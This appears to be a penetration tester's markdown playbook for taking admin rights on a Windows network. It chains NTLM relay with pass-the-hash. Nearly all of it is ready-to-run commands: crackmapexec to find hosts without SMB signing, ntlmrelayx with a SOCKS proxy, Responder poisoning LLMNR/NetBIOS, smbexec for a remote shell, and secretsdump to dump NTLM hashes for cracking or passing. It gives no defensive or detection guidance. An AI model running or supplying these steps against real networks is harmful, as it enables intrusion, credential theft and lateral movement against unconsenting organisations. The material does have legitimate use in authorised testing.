# Abusing NTLM Relay and Pass the Hash for Admin

## Attack Privilege Requirements
- [ ]  Layer 2 access to the Local Area Network
- [ ]  Impacket Suite installed on Linux 
- [ ]  SMB Signing disabled on victim endpoint
- [ ]  LLMNR Broadcasting must be running on network
- [ ]  Netbios must also be running on network

### Identify SMB Signing with Crackmapexec

First you need list of machines with SMB Signing disabled

```bash - kali
crackmapexec smb â€” gen-relay-list smb_targets.txt 192.168.1.0/24
```

### NTLMRelayx

Now that we have a list of targets with SMB signing disabled, we can use captured credentials and target the list of IPs. 

```bash - kali
ntlmrelayx.py -socks -smb2support -tf smb_targets.txt
```

Socks flag opens up SOCKS Server on port 1080 that we will use to relay captured credentials.

#### KEEP NTLMRELAYX CONSOLE RUNNING

###  Proxychains

To send requests through the SOCKS proxy created, we use proxychains. Edit /etc/proxychains4.conf with `sudo nano /etc/proxychains4.conf` and change the last line to be `socks4 127.0.0.1 1080` to point at the newly created SOCKS server.

### Responder

Now that we have NTLMrelayx waiting for users to authenticate with us, we are going to use Responder to relay credentials to our machine.
We need to change the config file to disable SMB and HTTP in either `/etc/responder/Responder.conf` or `/usr/share/responder/Responder.conf`

This is because NTLMRelayx is using SMB and HTTP

Start up Responder in a new console with 

```bash - kali
sudo responder -I eth0
```

Now we wait for Users or machines$ to authenticate with us

### SOCKS Connection

In the ntlmrelayx console, you should start to see sessions being initiated in the ntlmrelayx output

If not, type socks and hit enter in the ntlmrelayx console

Depending on the type of session is what type of access we have and what we can do.
If we want a shell use

```bash - kali
proxychains4 -q impacket-smbexec testdomain/testadmin:testpassword@192.168.1.161
```

##### Also, since the credentials are relayed through the SOCKS server, the password you put in does not matter.

As long as you use an account you have a socks session with, you can run commands on the machine as that user.

We can also dump NTLM Hashes/Secrets with impacket-secretsdump

```bash - kali
proxychains4 -q impacket-secretsdump testdomain/Testadmin:testpassword@192.168.1.161
```

Now that we have hashes, we can either crack them or attempt to pass them with tools such as Wmiexec, Evil-WinRm, XfreeRDP, etc.
If you're lucky, the SysAdmin left some program running on a machine that stores the plaintext creds in memory for a high privileged account. In all my engagements there has never not been plaintext credentials in memory.
